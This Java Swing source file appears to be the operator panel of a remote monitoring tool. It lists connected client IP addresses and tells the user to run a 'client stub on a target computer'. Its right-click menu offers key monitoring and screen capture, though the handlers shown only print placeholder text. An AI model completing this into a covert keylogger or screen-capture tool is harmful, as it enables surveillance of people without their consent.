package gui;

import head.RemoteMonitorServer;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;

import javax.swing.DefaultListModel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;

public class ServerPanel extends JPanel implements ActionListener {
	
	// List
	protected static final int LIST_WIDTH = 350;
	private DefaultListModel<InetAddress> listModel;
	private JList<InetAddress> clientList;
	private JScrollPane clientListScroll;

	// Popup menu
	private JPopupMenu popupMenu;
	private JMenuItem menuKeyl, menuPict, menuKill;
	
	// Side display panel
	private SidePanel sidePanel;
	
	public ServerPanel() throws UnknownHostException {
		
		// Setup panel settings
		setPreferredSize(new Dimension(ServerFrame.WINDOW_WIDTH, ServerFrame.WINDOW_HEIGHT));
		setLayout(null);
		
		// Creates list components and settings
		listModel = new DefaultListModel<InetAddress>();
		clientList = new JList<InetAddress>(listModel);
		clientList.setCellRenderer(new ClientListRenderer());
		clientListScroll = new JScrollPane(clientList);
		listModel.addElement(InetAddress.getLocalHost());
		
		// Prepares the popup menu for when the user right clicks on an element
		popupMenu = new JPopupMenu();
		popupMenu.add(menuKeyl = new JMenuItem("Start key monitoring"));
		popupMenu.add(menuPict = new JMenuItem("Request screen capture"));
		popupMenu.add(new JPopupMenu.Separator());
		popupMenu.add(menuKill = new JMenuItem("Terminate communications"));
		
		// Adds the side panel
		sidePanel = new SidePanel(new String[] {"Run the client stub on a target computer to connect!", 
				"Once connected, right click on any entry in the list to the left to execute various functions",
				"",
				"Your internal server IP is " + InetAddress.getLocalHost().getHostAddress() + ", with hostname " + InetAddress.getLocalHost().getHostName(),});
		
		// Sets up the various action listeners
		// Right click mouse listener for the right click menu on the client list
		clientList.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent me) {
				
				// if right mouse button clicked (or me.isPopupTrigger())
				if (SwingUtilities.isRightMouseButton(me) && !clientList.isSelectionEmpty())
					popupMenu.show(clientList, me.getX(), me.getY());
			}
		});
		// Adds the action listener to menu components
		menuKeyl.addActionListener(this);
		menuPict.addActionListener(this);
		menuKill.addActionListener(this);
		
		// Adds all the components
		clientListScroll.setBounds(15, 15, LIST_WIDTH, ServerFrame.WINDOW_HEIGHT - 15);
		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (45 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
		add(clientListScroll);
		add(sidePanel);
	}
	
	/**
	 * Updates the list of connected clients
	 */
	public void updateList() {
		// Gets list of connected clients
		ArrayList<InetAddress> connections = RemoteMonitorServer.clientServer.getConnectionList();
		
		// Removes all elements in current list, then adds current connections to it
		listModel.clear();
		for (int i = 0; i < connections.size(); i++)
			listModel.addElement(connections.get(i));
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		if (e.getSource() == menuKeyl) {
			System.out.println("memememes");
		} else if (e.getSource() == menuPict) {
			System.out.println("ASDASdasdasd");
		} else if (e.getSource() == menuKill) {
			System.out.println("qwyq38");
		}
		System.out.println(clientList.getSelectedValue().getHostAddress());
	}
	
//	private void paintComponent(Graphics g) {
//		super.paintComponent(g);
//		g.setColor(Color.GRAY);
//		g.drawLine(14, 14, 15 + LIST_WIDTH, 14);
//		g.drawLine(14, 14, 14, ServerFrame.WINDOW_HEIGHT);
//		g.drawLine(15 + LIST_WIDTH, 14, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
//		g.drawLine(14, ServerFrame.WINDOW_HEIGHT, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
//	}
}
